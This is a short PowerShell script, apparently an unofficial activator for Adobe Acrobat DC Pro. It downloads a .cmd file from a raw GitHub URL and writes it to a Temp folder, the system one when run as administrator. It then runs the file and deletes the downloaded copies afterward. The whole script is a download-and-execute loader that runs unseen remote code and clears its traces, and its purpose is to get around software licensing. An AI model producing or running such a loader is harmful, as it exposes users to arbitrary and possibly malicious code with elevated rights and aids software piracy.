# Active Adobe Acrobat DC Pro

$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/itsup-ftel/tools/refs/heads/main/file/Acrobatpro.cmd'

$rand = Get-Random -Maximum 99999999
$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\Acrobatpro_$rand.cmd" } else { "$env:TEMP\Acrobatpro_$rand.cmd" }

try {
    $response = Invoke-WebRequest -Uri $DownloadURL -UseBasicParsing
}
catch {
    Write-Error "Failed to download Acrobatpro.cmd from $DownloadURL"
    exit 1
}

$ScriptArgs = "$args "
$prefix = "@REM $rand `r`n"
$content = $prefix + $response
Set-Content -Path $FilePath -Value $content

Start-Process $FilePath $ScriptArgs -Wait

$FilePaths = @("$env:TEMP\Acrobatpro*.cmd", "$env:SystemRoot\Temp\Acrobatpro*.cmd")
foreach ($FilePath in $FilePaths) { Get-Item $FilePath | Remove-Item }
